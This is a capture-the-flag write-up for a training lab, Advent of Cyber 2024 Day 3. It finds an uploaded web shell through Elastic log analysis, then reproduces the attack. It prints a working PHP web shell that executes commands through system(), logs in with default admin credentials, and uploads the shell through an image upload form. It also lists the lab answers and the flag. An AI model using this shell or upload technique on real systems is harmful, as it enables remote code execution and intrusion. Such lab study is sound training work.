## **Advent of Cyber 2024 - Day 3 Writeup**

**Title:** _Even if I wanted to go, their vulnerabilities wouldn't allow it_

---

### **Task 9: Log Analysis – Day 3**

### **1. BLUE: Where was the web shell uploaded to?**

#### **Approach:**

1. **Access the Elastic Page:**
    
    - Open the provided URL and navigate to **ElasticSearch**.
2. **Navigate to Discover:**
    
    - Click on the **vertical nav bar** on the left and select **Discover**.
    - Ensure the **Frostypines** index is selected.
3. **Set the Time Filter:**
    
    - Set the date range: **October 1, 00:00 to October 3, 20:00**.
4. **Analyze Requests:**
    
    - Add the `requests` field to filter the log entries.
    - Search for suspicious file uploads to identify the web shell location.

#### **Answer:**

`/media/images/rooms/shell.php`

---

### **2. BLUE: What IP address accessed the web shell?**

#### **Approach:**

1. **Filter by Client IP Field:**
    
    - Add the **client IP** field in the ElasticSearch Discover view.
2. **Analyze Logs:**
    
    - Look for the IP address that accessed the malicious **shell.php** file.

#### **Answer:**

`10.11.83.34`

---

### **3. RED: What is the contents of the flag.txt?**

#### **Approach:**

1. **Modify `/etc/hosts` File:**
    
    - Add an entry to map the machine IP to the domain:
        `echo "<MACHINE_IP> frostypines.thm" | sudo tee -a /etc/hosts`
        
2. **Access the Web Application:**
    
    - Visit: `http://frostypines.thm`
    - Navigate to the **Reservation Tab**.
3. **Login to the Admin Panel:**
    
    - Use the credentials:
        - **Username:** `admin@frostypines.thm`
        - **Password:** `admin`
    - Access: `http://frostypines.thm/admin/index.php`.
4. **Upload a Web Shell:**
    
    - Save the following PHP code as `shell.php` (or any name):
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
        
5. **Upload the Shell:**
    
    - Use the **Add New Room** functionality to upload `shell.php`.
6. **Verify the Upload:**
    
    - After uploading, confirm the new room appears.
    - Open the image in a new tab to interact with the shell.
7. **Execute Commands to Retrieve the Flag:**
    
    - Verify the shell is working by typing `ls`.
    - Retrieve the flag by executing:
        `cat flag.txt`
        

#### **Answer:**

`THM{Gl1tch_Was_H3r3}`

---

### **Summary of Tools and Methods Used:**

1. **Tools:**
    
    - ElasticSearch (Discover)
    - Web Shell (PHP-based)
    - Linux `/etc/hosts` for DNS resolution
2. **Techniques:**
    
    - **Log Analysis:** Identified web shell location and accessing IP.
    - **Web Exploitation:** Uploaded and used a PHP web shell to execute commands remotely.

---

### **Key Concepts Learned:**

1. **Log Analysis:** Used ElasticSearch to identify the web shell and accessing IP.
2. **PHP Web Shell Exploitation:** Leveraged web application vulnerabilities to upload a malicious script.
3. **Flag Retrieval:** Executed commands remotely to obtain sensitive information.